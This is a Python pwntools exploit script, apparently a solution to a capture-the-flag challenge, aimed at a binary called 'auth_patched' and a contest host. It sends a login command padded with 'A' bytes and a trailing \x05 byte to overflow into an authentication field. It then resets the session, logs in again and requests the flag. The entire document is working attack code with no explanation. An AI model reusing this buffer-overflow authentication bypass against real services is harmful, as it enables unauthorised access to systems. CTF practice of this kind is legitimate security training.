#!/usr/bin/python3
from pwn import *

PATH = "./auth_patched"
HOST = "pwn3.cscv.vn"
PORT = 5555

exe = context.binary = ELF(PATH, checksec=False)
#libc = ELF("libc.so.6") if args.REMOTE  else exe.libc
context.terminal = ['tmux', 'splitw', '-h', '-p', '55']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

gs = '''
set pagination off
set breakpoint pending on

b*0x0000000000400AFA
b*0x0000000000400C0C
b*0x0000000000400C45

c
'''

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else: 
        return process(exe.path)
def GDB():
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    sleep(1)

p = conn()
GDB()

payload = b"login " + b'A'*0x8 + b'\x05'
sla(b"> ", payload)
sla(b"> ", b"reset")
sla(b"> ", b"login KKK")
sla(b"> ", b"get-flag")

p.interactive()
